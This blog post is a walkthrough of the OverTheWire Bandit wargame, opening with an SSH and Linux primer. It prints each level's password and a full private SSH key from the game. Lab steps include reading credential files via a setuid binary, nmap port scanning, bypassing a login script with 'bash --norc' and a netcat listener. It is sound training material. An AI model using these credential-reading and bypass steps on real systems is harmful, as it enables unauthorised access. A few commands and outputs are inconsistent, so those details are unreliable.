---
title: Overthewire - bandit
# author: Grace JyL
date: 2020-02-17 11:11:11 -0400
description:
excerpt_separator:
categories: [Lab, Overthewire]
tags: [Lab, Overthewire, SSH]
math: true
# pin: true
toc: true
# image: /assets/img/sample/devices-mockup.png
---

[toc]

---


```
2/17/2020 updated.
Lo termino todo~ estos son solución, pienses que si quiere verlo.


休息一下~ 休息一下~
￣￣￣￣￣＼／￣￣￣￣
　　　 　∧＿∧　　　　
　　;;（´・ω・） 　
　＿旦_(っ(,,■)＿＿
|l￣l||￣しﾞしﾞ￣|i

```



# overthewire - bandit


[toc]

`bandit0@bandit.labs.overthewire.org -p 2220`

---

# Solutions

## Bandit Level 0
Level Goal
- log into the game using SSH.
- The host to which you need to connect is `bandit.labs.overthewire.org`, on port `2220`.
- The username is `bandit0` and the password is `bandit0`.
- Once logged in, go to the Level 1 page to find out how to beat Level 1.

solutions
```py
$ ssh bandit0@bandit.labs.overthewire.org -p 2220
Are you sure you want to continue connecting (yes/no)? yes
bandit0@bandit.labs.overthewire.org's password: bandit0

Linux bandit 4.18.12 x86_64 GNU/Linux
Welcome to OverTheWire!

bandit0@bandit:~$ exit
logout
```

guide:
- connecting to another computer over the Internet,  to keep your data safe. `SSH` is one way to help do that.
- need to `set up SSH` properly on your computer
- and then `create an encrypted connection to your server`.
- for the connection to be secure, both ends of the connection need to `have SSH enabled`.

### 1. Connecting for the First Time
####    1. `Install SSH`
- Windows:
  - download and install an `SSH client program`. The most popular one is `Cygwin`, free from the developer’s website. Download and install it like you would any other program. Another popular free program is `PuTTY`.
  - During the Cygwin installation, you must choose to `install OpenSSH` from the Net section.
  - Windows 10: install the Windows Subsystem for Linux which comes with SSH preinstalled.
- Linux and Mac OS X: comse with SSH already installed on the system. This is because SSH is a UNIX system, and Linux and OS X are derived from UNIX.

####    2. `Run SSH`
- Open the terminal program that is installed by Cygwin, Bash on Ubuntu / Win, Terminal in OS X / Linux.
- SSH uses the terminal interface to interact with other computers. no graphical interface for SSH.
####    3. `Test the connection`
- Before dive into creating secure keys and moving files, test that SSH is properly configured on your computer as well as the system you are connecting to.
- Enter command: $ `ssh <username>@<remote>`
  - <username>: your username on the remote computer,
  - <remote>: the address for the remote computer/ server
  - to specify a port: add `-p 0000(port number)`
  - You will be asked for your password once the connection is established. You will not see the cursor move or any characters input when you type your password.
  - If this step fails:
    - SSH is configured incorrectly on your computer
    - the remote computer is not accepting SSH connections.

### 2. Basic Commands
####    1. Navigate the SSH shell `cd command`
- When first connect to the remote computer, should be in your `HOME directory`.
- To move around the directory structure: `cd` command:
  - `cd ..`: move you up one directory.
  - `cd <directoryname>`: into the specified subdirectory.
  - `cd /home/directory/path/`: to the specified directory from the root (home).
  - `cd ~`: return to HOME directory.
####    2. Check your current directory's contents. `ls command`
- To see what files and folders in your current location: `ls` command
  - `ls`: list all of the files and folders in current directory.
  - `ls –l`: list the contents of the directory along with additional information, such as size, permissions, and date.
  - `ls -a`: list all the contents including hidden files and folders.

####    3. Copy files between pc `scp command`
```py
# copy files between local computer and computer accessing remotely
# copy example1.txt to the specified <path> on the remote computer
$ scp /localdirectory/example1.txt <username>@<remote>:<path>
- leave <path> blank: copy to the root folder of the remote computer.

# move example1.txt from the home directory on the remote computer to the current directory on the local computer.
$ scp <username>@<remote>:/home/example1.txt ./
```
####    4. Copy files. `cp command`
- to make copies of files either in the same directory or into a directory of your choosing:
- `cp example1.txt example2.txt`: create a copy of example1.txt called example2.txt in the same location.
- `cp example1.txt <directory>/`: create a copy of example1.txt in the location specified by <directory>.
####    5. Move and rename files. `mv command`
- to change file’s name / move it not copying.
- `mv example1.txt example2.txt`: rename example1.txt to example2.txt. The file will stay in the same location.
- `mv directory1 directory2`: rename directory1 to directory2. The directory’s contents will remain unchanged.
- `mv example1.txt directory2/`: move txt to directory2.
- `mv example1.txt directory2/example2.txt`: move txt to directory2 and rename it to example2.txt

####    6. Delete files and directories. `rm command`
- to remove anything from the computer you are connected to.
- `rm example1.txt`: delete the file example1.txt.
- `rm –I example1.txt`: delete the file example1.txt after prompting you to confirm.
- `rm directory1/`: delete directory1 and all of its contents.
####    7. Change permissions for your files. `chmod`
- You can change the read and write
- `chmod u+w example1.txt`: add the write (modify) permission to the file for the user (u), g for group permissions, o for world permissions.
- `chmod g+r example1.txt`: add the read (access) permission to the file for the group.
####    8. other Commands
- `mkdir newdirectory`: create new subdirectory called newdirectory.
- `pwd`: display your current directory location.
- `who`: shows who is logged into the system.
- `pico newfile.txt` or `vi newfile.txt`: create a new file and open the file editor. Different system will have different file editors installed. may need different commands for different file editor installed.
- `man <command>`: display info about that command.
- `man –k <keyword>`: search all of the man pages for the keyword you specify.

### 3. Creating Encrypted Keys
#### 1. Create your SSH keys.
- These keys will allow you to connect to the remote location without enter your password each time. a much more secure way to connect to the remote computer, as the password will not have to transmitted over the network.
```py
# 1. Create the key folder on your computer:
$ mkdir .ssh
# 2. Create the public and private keys:
$ ssh-keygen –t rsa
  - You will be asked if you would like to create a passphrase for the keys (optional).
  - If you don’t want to create a passphrase, press Enter.
  - This will create two keys in the .ssh directory: *privatekey* `id_rsa` and *publickey* `id_rsa.pub`
# Change your private key’s permissions. to ensure that the private key is only readable by you, enter the command
$ chmod 600 .ssh/id_rsa
```

#### 2. Place the public key on the remote computer.
- Once your keys are created, you’re ready to `place the public key on the remote computer` to connect without a password.
```py
# replacing the appropriate parts as explained earlier:
$ scp .ssh/id_rsa.pub <username>@<remote>:
$ scp .ssh/id_rsa.pub <wiki@shell.cjb.net>:
# Make sure include the colon (:) at the end.
# will be asked to input your password before the file transfer starts.
```

#### 3. Install the public key on the remote computer.
- Once placed the key on the remote computer, need to install it to work correctly.
```py
# 1. log in to the remote computer
$ ssh wiki@shell.cjb.net
# 2. Create an SSH folder on the remote computer, if not already exist
$ mkdir .ssh
# 3. Append your key to the authorized keys file. If the file does not exist yet, it will be created:
$ cat id_rsa.pub >> .ssh/authorized_keys
# 4. Change the permissions for the SSH folder to allow access:
$ chmod 700 .ssh
```

#### 4. Check that the connection works.
- Once the key has been installed on the remote computer, you should be able to initiate a connection without being asked to enter your password.
```py
# 1. to test the connection:
$ ssh <username>@<remote>
# If you connect without being prompted for the password, then the keys are configured
```

## Bandit Level 0 → Level 1
Level Goal
- The password for the next level is stored in a file called `readme` located in the `home directory`.
- Use this password to `log into bandit1` using SSH.
- Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.
- Commands you may need to solve this level
ls, cd, cat, file, du, find

solution
```py
$ ssh bandit0@bandit.labs.overthewire.org -p 2220
Are you sure you want to continue connecting (yes/no)? yes
bandit0@bandit.labs.overthewire.org's password: bandit0
# Linux bandit 4.18.12 x86_64 GNU/Linux
# Welcome to OverTheWire!
bandit0@melinda:~$ ls
readme
bandit0@melinda:~$ cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
```


## Bandit Level 1 → Level 2
Level Goal
- The password for the next level is stored in a file called - located in the home directory

solution
```py
# boJ9jbbUNNfktd78OOpsqOltutMc3MY1

bandit1@melinda:~$ ls -a
-  .  ..  .bash_logout  .bashrc  .profile
bandit1@melinda:~$ cat ./-
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
```

## Bandit Level 2 → Level 3
Level Goal
- The password for the next level is stored in a file called spaces in this filename located in the home directory

solution
```py
# CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

bandit2@melinda:~$ dir
spaces\ in\ this\ filename
bandit1@melinda:~$ cat spaces\ in\ this\ filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```

## Bandit Level 3 → Level 4 `hidden file: ls -a`
Level Goal
- The password for the next level is stored in a hidden file in the `inhere` directory.

solution
```py
# UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

bandit3@melinda:~$ ls
inhere
bandit3@melinda:~$ cd inhere
bandit3@melinda:~/inhere$ ls -a
.  ..  .hidden
bandit3@melinda:~/inhere$ cat .hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```

## Bandit Level 4 → Level 5 `file ./-* check the file type`
Level Goal
- The password for the next level is stored in the only human-readable file in the `inhere` directory. Tip: if your terminal is messed up, try the “reset” command.

solution
```py
# pIwrPrtPN36QITSp3EQaw936yaFoFgAB

# file ./-*
# ./-* this shell glob will pick up the all files which starts from - (minus sign) and print the file format of the file.

bandit4@melinda:~$ ls -a
.  ..  .bash_logout  .bashrc  .profile  inhere
bandit4@melinda:~$ cd inhere
bandit4@melinda:~/inhere$ ls -a
-file00  -file02  -file04  -file06  -file08  .
-file01  -file03  -file05  -file07  -file09  ..
bandit4@melinda:~/inhere$ file ./-*
./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data
bandit4@melinda:~/inhere$ cat ./-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
```

## Bandit Level 5 → Level 6 `find -type XX -size XX`
Level Goal
- The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties:
- human-readable
- 1033 bytes in size
- not executable

solution
```py
# koReBOKuIDDepwhWk7jZC0RTdopnAYKh

bandit5@melinda:~$ ls
inhere
bandit5@melinda:~$ cd inhere
bandit5@melinda:~/inhere$ ls -a
.            maybehere02  maybehere06  maybehere10  maybehere14  maybehere18
..           maybehere03  maybehere07  maybehere11  maybehere15  maybehere19
maybehere00  maybehere04  maybehere08  maybehere12  maybehere16
maybehere01  maybehere05  maybehere09  maybehere13  maybehere17

bandit5@melinda:~/inhere$ find -type f -size 1033c
./maybehere07/.file2
bandit5@melinda:~/inhere$ cat ./maybehere07/.file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```

## Bandit Level 6 → Level 7 `find / -user -group -size 2>/dev/null`
Level Goal
- The password for the next level is stored somewhere on the server and has all of the following properties:
- owned by user bandit7
- owned by group bandit6
- 33 bytes in size

solution
```py
$ ssh bandit6@bandit.labs.overthewire.org -p 2220

# “2> /dev/null” 代表忽略掉错误提示信息
# https://www.zhihu.com/question/53295083
bandit6@melinda:~$ find / -user bandit7 -group bandit6 -size 32c 2>/dev/null
/var/lib/dpkg/info/bandit7.password

bandit6@melinda:~$ cat /var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
```

## Bandit Level 7 → Level 8 `awk '/millionth/' data.txt`
Level Goal
- The password for the next level is stored in the file `data.txt` next to the word `millionth`
```py
$ ls -a
.  ..  .bash_logout  .bashrc  .profile  data.txt
$ cat data.txt
humiliation's	47r0YuNylaQ3k6HqGF5NsPPiGuolDCjn
malarkey's	0huyJeRwvtJaoyRmJjQFsRnQcYG4gDir
prioress	ocudTlq9CbpCw9aByrqGffAuoYvCmLNV
....

$ awk '/millionth/' data.txt
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
$ awk '/^millionth/ {print $2;}' data.txt
cvX2JJa4CFALtqS87jk27qwqGhBM9plV
$ cat data.txt | grep millionth
millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```

## Bandit Level 8 → Level 9 `text that occurs only once: sort data.txt | uniq -u`
Level Goal
- The password for the next level is stored in the file data.txt and is the only line of text that occurs only once

solution
```py
$ ls -a
.  ..  .bash_logout  .bashrc  data.txt  .profile
$ cat data.txt
KerqNiDbY0zV2VxnOCmWX5XWxumldlAe
MsxcvOe3PGrt78wpZG2bBNF5wfXpZhET
...

$ cat data.txt | sort | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
$ sort data.txt | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
```

- sort data.txt | `uniq -u` : 直接-u获取
- sort data.txt | `uniq -c` : -c列出出现的次数，然后从中找到是1的那一行即可

---

## Bandit Level 9 → Level 10 `strings data.txt | grep "="`
Level Goal
- The password for the next level is stored in the file `data.txt` in one of the few human-readable strings, beginning with several ‘=’ characters.

solution
```py
$ ls -a
.  ..  .bash_logout  .bashrc  .profile  data.txt
$ strings data.txt | grep "="
epr~F=K
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
ie)=5e
```

---

## Bandit Level 10 → Level 11 `echo txt | base64 --decode, base64 -d data.txt`
Level Goal
- The password for the next level is stored in the file data.txt, which contains base64 encoded data

solution
```py
$ ls -a
.  ..  .bash_logout  .bashrc  .profile  data.txt
$ cat data.txt
VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==

$ echo VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg== | base64 --decode
$ base64 -d data.txt
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
```

---

## Bandit Level 11 → Level 12 `cat data.txt | tr 'A-Z a-z' 'N-ZA-M n-za-m'`
Level Goal
- The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions

Commands used for this level:
`ls` – List information about the FILE’s (the current directory by default).
`cat` – used to view contents of a file.
`tr` – translate or delete characters.

`tr -c -d -s [“string1_to_translate_from”][“string2_to_translate_to”] < input-file`

solution
```py
$ ls -a
.  ..  .bash_logout  .bashrc  data.txt  .profile
$ cat data.txt
Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh

$ cat data.txt | tr 'A-Z a-z' 'N-ZA-M n-za-m'
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
$ cat data.txt | tr [A-Za-z] [N-ZA-Mn-za-m]
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```

---

## Bandit Level 12 → Level 13
Level Goal
- The password for the next level is stored in the file data.txt, which is `a hexdump of a file that has been repeatedly compressed`.
- For this level it may be useful to create a directory under `/tmp` in which you can work using mkdir.
- For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)

```py
$ ls
data.txt
$ cat data.txt
#00000000: 1f8b 0808 d7d2 c55b 0203 6461 7461 322e  .......[..data2.
#00000010: 6269 6e00 013c 02c3 fd42 5a68 3931 4159  bin..<...BZh91AY
...
$ file data.txt
data.txt: ASCII text
$ xxd -r data.txt > data.bin
-bash: data.bin: Permission denied
# 这本来是一个文本类型的文件
# 尝试用xxd转成bin提示权限不够

# 先复制一遍
$ mkdir /tmp/jhalon
$ cp data.txt /tmp/jhalon
$ cd /tmp/jhalon

$ xxd -r data.txt > /tmp/jhalon/file.bin
$ file file.bin
file.bin: gzip compressed data, was "data2.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix

# 是gzip格式，改文件名，解压
$ mv data.bin data.gz
bandit12@bandit:/tmp/c1911$ gzip -d data.gz
bandit12@bandit:/tmp/c1911$ ls
data  data.txt
bandit12@bandit:/tmp/c1911$ file data
data: bzip2 compressed data, block size = 900k
# 还有一层bzip2, 继续解压
bandit12@bandit:/tmp/c1911$ mv data data.bz2
bandit12@bandit:/tmp/c1911$ bunzip2 -d data.bz2
bandit12@bandit:/tmp/c1911$ file data
data: gzip compressed data, was "data4.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
# 还有没有解压的文件，继续
bandit12@bandit:/tmp/c1911$ mv data data.gz
bandit12@bandit:/tmp/c1911$ gzip -d data.gz
bandit12@bandit:/tmp/c1911$ file data
data: POSIX tar archive (GNU)
bandit12@bandit:/tmp/c1911$ mv data data.tar
bandit12@bandit:/tmp/c1911$ tar xvf data.tar
data5.bin

bandit12@bandit:/tmp/c1911$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/c1911$ mv data5.bin data5.tar
bandit12@bandit:/tmp/c1911$ tar xvf data5.tar
data6.bin

bandit12@bandit:/tmp/c1911$ file data6
data6: cannot open `data6' (No such file or directory)
bandit12@bandit:/tmp/c1911$ file data6.bin
data6.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/c1911$ bunzip2 -d data6.bin
bunzip2: Can't guess original name for data6.bin -- using data6.bin.out
bandit12@bandit:/tmp/c1911$ file data6.bin.out
data6.bin.out: POSIX tar archive (GNU)
bandit12@bandit:/tmp/c1911$ mv data6.bin.out data.tar
bandit12@bandit:/tmp/c1911$ tar xvf data.tar
data8.bin

bandit12@bandit:/tmp/c1911$ file data8.bin
data8.bin: gzip compressed data, was "data9.bin", last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
bandit12@bandit:/tmp/c1911$ mv data8.bin data8.gz
bandit12@bandit:/tmp/c1911$ gzip -d data8.gz
bandit12@bandit:/tmp/c1911$ ls
data5.tar  data8  data.tar  data.txt
bandit12@bandit:/tmp/c1911$ cat data8
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL



$ zcat file.bin | file -
/dev/stdin: bzip2 compressed data, block size = 900k
$ zcat file.bin | bzcat | file -
/dev/stdin: gzip compressed data, was "data4.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
$ zcat file.bin | bzcat | zcat | file -
/dev/stdin: POSIX tar archive (GNU)
$ zcat file.bin | bzcat | zcat | tar xO | file -
/dev/stdin: POSIX tar archive (GNU)
$ zcat file.bin | bzcat | zcat | tar xO | tar xO | file -
/dev/stdin: bzip2 compressed data, block size = 900k

$ zcat file.bin | bzcat | zcat | tar xO | tar xO | bzcat | file -
/dev/stdin: POSIX tar archive (GNU)
$ zcat file.bin | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | file -
/dev/stdin: gzip compressed data, was "data9.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression

$ zcat file.bin | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | zcat | file -
/dev/stdin: ASCII text
$ zcat file.bin | bzcat | zcat | tar xO | tar xO | bzcat | tar xO | zcat
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
# we MUST remove the created directory after we are done

bandit12@bandit:/tmp/jhalon$ cd ..
bandit12@bandit:/tmp$ rm -rf jhalon
bandit12@bandit:/tmp$ reset
# NOTE: Every time you create a directory in /tmp/ from now one, delete it before moving on.\
```

---

## Bandit Level 13 → Level 14 `ssh -i sshkey.private bandit14@localhost`
Level Goal
- The password for the next level is stored in `/etc/bandit_pass/bandit14` and can only be read by user `bandit14`.
- For this level, you don’t get the next password, but you get a `private SSH key` that can be used to log into the next level.

```py
bandit13@bandit:~$ ls -a
.  ..  .bash_logout  .bashrc  .profile  sshkey.private

bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
Are you sure you want to continue connecting (yes/no)? yes
#localhost is a hostname that refers to the machine you are working on
bandit14@bandit:~$
bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
```

---

## Bandit Level 14 → Level 15 `$ telnet localhost 30000`
Level Goal
- The password for the next level can be retrieved by `submitting the password` of the current level to `port 30000 on localhost`.

```py
$ telnet localhost 30000
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
# 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
Connection closed by foreign host.
```

---

## Bandit Level 15 → Level 16 `$ openssl s_client -ign_eof -connect localhost:30001`
Level Goal
- The password for the next level can be retrieved by submitting the password of the current level to `port 30001 on localhost` `using SSL encryption.`
- Helpful note:
  - Getting “HEARTBEATING” and “Read R BLOCK”?
  - Use `-ign_eof` and read the “CONNECTED COMMANDS” section in the manpage.
  - Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…

```py
1.
$ openssl s_client -ign_eof -connect localhost:30001
...
Extended master secret: yes
---
# BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd
closed

2.
$ echo BfMYroe26WYalil77FoDi9qh59eK5xNr | openssl s_client -quiet -connect localhost:30001
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd
```

---

## Bandit Level 16 → Level 17 `ssh -i ./sshkey.private bandit17@local`
Level Goal
- The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000.
- First `find out which of these ports have a server listening` on them.
- Then find out which of those speak SSL and which don’t.
- There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.

```py
$ ssh bandit16@bandit.labs.overthewire.org -p 2220
# password: cluFn7wTiGryunymYOu4RcffSxQluehd

bandit16@bandit:~$ nmap -p 31000-32000 -sV localhost
...
PORT      STATE SERVICE     VERSION
31518/tcp open  ssl/echo
31790/tcp open  ssl/unknown
...

$ echo cluFn7wTiGryunymYOu4RcffSxQluehd | openssl s_client -quiet -connect localhost:31518
...
cluFn7wTiGryunymYOu4RcffSxQluehd

$ echo cluFn7wTiGryunymYOu4RcffSxQluehd | openssl s_client -quiet -connect localhost:31790
...
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
...
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----


$ openssl s_client -connect localhost:31790
# cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

closed

bandit16@melinda:~$ mkdir /tmp/jhalon
bandit16@melinda:~$ cd /tmp/jhalon
bandit16@melinda:/tmp/jhalon$ nano sshkey.private
# create a new file in a tmp directory.
# copy the RSA Key (Don’t forget to get the Header and Footer)

bandit16@melinda:/tmp/jhalon$ chmod 600 sshkey.private
bandit16@melinda:/tmp/jhalon$ ssh -i ./sshkey.private bandit17@localhost

Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit16/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
Enjoy your stay!

bandit17@bandit:~$
```

---

## Bandit Level 17 → Level 18 `diff passwords.new passwords.old`
Level Goal
- There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new
- NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19

```py
$ ls -a
.  ..  .bandit16.password  .bash_logout  .bashrc  passwords.new  passwords.old  .profile  .ssh

$ cat passwords.new | diff passwords.old -
42c42
< hlbSBPAWJmL6WFDb06gpTx1pPButblOA
---
> kfBf3eYk5BPBRzwjqutbbfE887SVc5Y

$ diff passwords.new passwords.old
42c42
< kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
---
> hlbSBPAWJmL6WFDb06gpTx1pPButblOA

Note: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd is password
diff shows what needs to be changed to equal the second file.
< means first file (so passwords.new)
> means second file (so passwords.old)
```

---

## Bandit Level 18 → Level 19 `ssh bandit18@bandit.labs.overthewire.org -p 2220 'bash --norc'`
Level Goal
- The password for the next level is stored in a file `readme` in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.

intel `.bashrc` has been modified to logout as soon as we login
`.bashrc` is a part of our  “profile” on the remote server that tells the operating system things about our particular profile, such as home directory, preferred shell and text editor, runs a script that logs us off when we try to ssh in.

there are ways to `get the shell to ignore the startup script`.

PuTTY
  - start with putty
  - remote command: `bandit.labs.overthewire.org`
  - close window on exit: only on clean exit
  - SSH category:
    - Remote command: `/bin/bash –norc`
    - `/bin/bash` : telling putty what shell to send the remote command
    - the option `–norc` : tells the terminal to ignore the `.bashrc` “profile” file. And bypassing this doesn’t initialize the script that logs us out.
  - So now we’re in!
  - login as: bandit18
  - password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd

```py
$ ssh -t bandit18@bandit.labs.overthewire.org -p 2220 '/bin/bash --norc'
bandit18@bandit.labs.overthewire.orgs password: # kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd

bash-4.4$ PS1="\u@\h \w$"
bandit18@bandit ~$

bandit18@bandit ~$ls -a
.  ..  .bash_logout  .bashrc  .profile	readme
bandit18@bandit ~$cat readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

```

- `-t` tells the host to run the remote command `–norc` from the shell bash, in order to ignore the `.bashrc` file, and avoid getting logged out.

- bash-4.4$ .
  - Because we tell the shell to ignore the profile in order to get logged on we have lost some functionality, including not getting our customized command prompt.
  - This is because what is in front of the $ is an environmental variable , which is user defined and most are user specific.
  - The one that tells the shell what to display on the prompt is `PS1`.
  - The way to change this is to simply enter the command
    - `$ PS1=“Hello World”`
    - to give information about  username, the host and the present working directory
    - `$ PS1="\u@\h \w$"`
      - \u being the current user name,
      - \h being the current host and
      - \w being the present working directory, and the dollar sign

```py
$ ssh bandit18@bandit.labs.overthewire.org -p 2220 '/bin/bash --norc'
$ ssh bandit18@bandit.labs.overthewire.org -p 2220 'bash --norc'
bandit18@bandit.labs.overthewire.orgs password:  # kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
ls -a
.
..
.bash_logout
.bashrc
.profile
readme
cat readme
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```

---

## Bandit Level 19 → Level 20 `./bandit20-do cat /etc/bandit_pass/bandit20`
Level Goal
- To gain access to the next level, you should use the `setuid` binary in the homedirectory. Execute it without arguments to find out how to use it.
- The password for this level can be found in the usual place (`/etc/bandit_pass`), after you have used the setuid binary.


```py
$ ls
bandit20-do
$ ls -a
.  ..  .bash_logout  .bashrc  .profile  bandit20-do

# Executing files on Unix systems: simply give the path to the file.
# If you are in the current directory as the file: simply typing ./
$ ./bandit20-do
Run a command as another user.
  Example: ./bandit20-do id

bandit19@bandit:~$ ./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
# Uid are user identification numbers and are unique to each users.
# Uid of normal users start at 1000 and are theoretically unlimited
0 is root
1-99 are reserved for other predefined accounts
100-999 are reserved for other system account and groups.
# gid is group id
# euid is an effective user id. This is the one that is used when the system checks whether the user in question has sufficient permissions.

# the file that has the next password will only have read permission for bandit20 user, but let’s see.
bandit19@bandit:~$ cat /etc/bandit_pass/bandit20
cat: /etc/bandit_pass/bandit20: Permission denied

bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

---

## Bandit Level 20 → Level 21 `$ nc -lp 1025`
Level Goal
- There is a setuid binary in the home directory that does the following:
  - it `makes a connection to localhost on the port you specify` as a command line argument.
  - It then reads a line of text from the connection and compares it to the password in the previous level (bandit20).
